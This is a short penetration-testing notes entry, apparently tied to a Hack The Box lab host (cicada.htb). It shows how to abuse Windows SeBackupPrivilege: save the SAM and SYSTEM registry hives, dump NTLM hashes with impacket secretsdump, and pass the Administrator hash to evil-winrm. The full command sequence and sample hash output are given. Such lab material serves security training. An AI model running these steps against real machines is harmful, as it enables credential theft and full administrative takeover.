## SeBackupPrivilege
SeBackupPrivilege exploitation
```
whoami /priv

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
[...]
```
`SeBackupPrivilege`, typically given to service accounts or administrative users. 
This privilege was designed to facilitate system backups, and as such, it enables access to
system-protected files while bypassing other existing permissions. 
This means that in a realistic scenario, a user account should not be granted this privilege as they effectively have access to
sensitive files such as the SYSTEM and SAM Windows Registry Hives. These hives contain the
information we need to escalate our privileges!
Simply put, we can use these hives to dump user NTLM hashes. We can then use the Administrator
hash to authenticate instead of a plaintext password.

We will use the reg save command to perform a command in the registry, specify the location of
the hive, and save it to a file in the current directory with the appropriate name.

Obtain SAM and SYSTEM registry hives
```
# Using evil-winrm session to the victim host
cd C:\temp
reg save hklm\sam sam
reg save hklm\system system
download sam
download system
```
Extract hashes
```
# On Kali host
secretsdump.py -sam sam -system system LOCAL
OR
impacket-secretsdump -sam sam -system system local

[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```
Use tha hashes with evil-winrm for execution
```
# evil-winrm -u Administrator -H <NT hash> -i cicada.htb
evil-winrm -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i cicada.htb
```
PROFIT!!!
